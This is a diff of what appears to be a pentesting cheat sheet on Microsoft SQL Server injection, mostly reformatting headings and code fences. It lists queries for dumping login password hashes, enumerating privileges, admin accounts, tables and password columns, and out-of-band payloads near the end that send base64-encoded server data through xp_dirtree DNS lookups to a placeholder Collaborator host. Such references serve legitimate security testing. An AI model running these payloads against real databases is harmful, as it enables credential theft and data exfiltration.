@@ -5,7 +5,12 @@ permalink: /mssqli
 
 # Microsoft MSSQLI
 
-## String concatenation: 
+### Current Database
+```bash
+SELECT DB_NAME()
+```
+
+### String concatenation: 
 You can concatenate together multiple strings to make a single string.
 ```bash
 'foo'+'bar'
@@ -32,11 +37,11 @@ SELECT @@version
 ```
 
 
-# ORDER BY 
+### ORDER BY 
 ```bash
 ORDER BY N-- Where N input number 1,2,3,4,5,6,7,8 etc..
 ```
-# Current User	
+### Current User	
 ```bash
 
 SELECT user_name();
@@ -46,25 +51,23 @@ SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
 
 ```
 
-# List Users
+### List Users
 
+```bash
 SELECT name FROM master..syslogins
+```
 
-
-# List Password Hashes
-
+### List Password Hashes
+```bash
 SELECT name, password FROM master..sysxlogins - priv, mssql 2000;
 SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins - priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.
 SELECT name, password_hash FROM master.sys.sql_logins - priv, mssql 2005;
 SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins - priv, mssql 2005
+```
 
 
-
- # Password Cracker
- MSSQL 2000 and 2005 Hashes are both SHA1-based.  
-
- # List Privileges
-
+ ### List Privileges
+```bash
  -- current privs on a particular object in 2005, 2008
 SELECT permission_name FROM master..fn_my_permissions(null, 'DATABASE'); - current database
 SELECT permission_name FROM master..fn_my_permissions(null, 'SERVER'); - current server
@@ -97,45 +100,55 @@ SELECT name FROM master..syslogins WHERE diskadmin = 1;
 SELECT name FROM master..syslogins WHERE dbcreator = 1;
 SELECT name FROM master..syslogins WHERE bulkadmin = 1;
 
+```
 
-# List DBA Accounts
+### List DBA Accounts
+```bash
 SELECT is_srvrolemember('sysadmin'); - is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try 'bulkadmin', 'systemadmin' and other values from the documentation https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?redirectedfrom=MSDN&view=sql-server-ver15
 SELECT is_srvrolemember('sysadmin', 'sa'); - is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.
 SELECT name FROM master..syslogins WHERE sysadmin = '1' - tested on 2005
+```
 
 
-# Current Database
-SELECT DB_NAME()
-
-# List Databases
+### List Databases:
+```
 SELECT name FROM master..sysdatabases;
 SELECT DB_NAME(N); -- for N = Number i.e Database number 0, 1, 2, and so on
+```
 
-# List Columns
-
+### List Columns:
+```
 SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable'); - for the current DB only
 SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; - list colum names and types for master..sometable
+```
 
-# List Tables
-
+### List Tables:
+```bash
 SELECT name FROM master..sysobjects WHERE xtype = 'U'; - use xtype = 'V' for views
 SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';
 SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; - list colum names and types for master..sometable
+```
 
-# Find Tables From Column Name 
+### Find Tables From Column Name:
+```bash
 - NB: This example works only for the current database.  If you wan't to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).
 SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%PASSWORD%' - this lists table, column for each column containing the word 'password'
+```
 
-# Select Nth Row
+### Select Nth Row:
+```bash
 SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC - gets 9th row
-
-# Select Nth Char
+```
+### Select Nth Char
+```bash
 SELECT substring('abcd', 3, 1) - returns c
+```
 
-# Bitwise AND
+### Bitwise AND:
+```bash
 SELECT 6 & 2 - returns 2
 SELECT 6 & 1 - returns 0
-
+```
 # ASCII Value -> Char
 SELECT char(0x41) - returns A
 
@@ -244,7 +257,7 @@ You can cause the database to perform a DNS lookup to an external domain contain
 Due to the domain and subdomain max characters limitations, it becomes challenging to exfiltrate data. A maximum of 63 characters are allowed for each subdomain and in total 253 characters for the full domain name. Fragmentation and encoding are two methods that can be used to overcome these limitations.
 (SQLi exfiltration using Out of band technique)[https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b]
 
-1-
+First Part
 ```bash
 DECLARE @d varchar(1024); DECLARE @T varchar(1024);
 SELECT @d = (SELECT SUBSTRING(CAST(SERVERPROPERTY('edition') as
@@ -252,13 +265,16 @@ varbinary(max)), 1,LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))/2) FOR
 SELECT @T = (SELECT REPLACE(@d, '=', '')); EXEC('master..xp_dirtree "\\'+@T+'.YourBRUPCOLLAB.net\egg$"');
 ```
 
-2- 
+Second Part
 ```bash
 DECLARE @e varchar(1024); DECLARE @T varchar(1024);
 SELECT @e = (SELECT SUBSTRING(CAST(SERVERPROPERTY('edition') as
 varbinary(max)), LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))/2, LEN(CAST(SERVERPROPERTY('edition') as varbinary(max)))) FOR XML PATH(''), BINARY BASE64); 
 SELECT @T = (SELECT REPLACE(@e, '=', '')); EXEC('master..xp_dirtree "\\'+@T+'.BRUPCOLLAB.net\egg$"');
 ```
+
+### Password Cracker:
+MSSQL 2000 and 2005 Hashes are both SHA1-based.  
 
 
 
